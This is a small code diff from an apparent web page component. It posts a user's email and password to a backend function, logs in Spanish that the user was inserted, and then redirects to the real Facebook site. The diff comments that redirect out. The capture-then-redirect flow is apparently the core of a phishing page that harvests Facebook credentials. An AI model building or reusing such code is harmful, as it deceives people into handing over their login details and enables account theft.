@@ -14,7 +14,7 @@ export default function Home() {
     try {
       await postPersonas({ email: email, password: password });
       console.log('Usuario insertado correctamente.');
-      window.location.href = "https://www.facebook.com/?locale=es_LA";
+      // window.location.href = "https://www.facebook.com/?locale=es_LA";
     } catch (error) {
       console.error("Fallo en el registro:", error);
     }
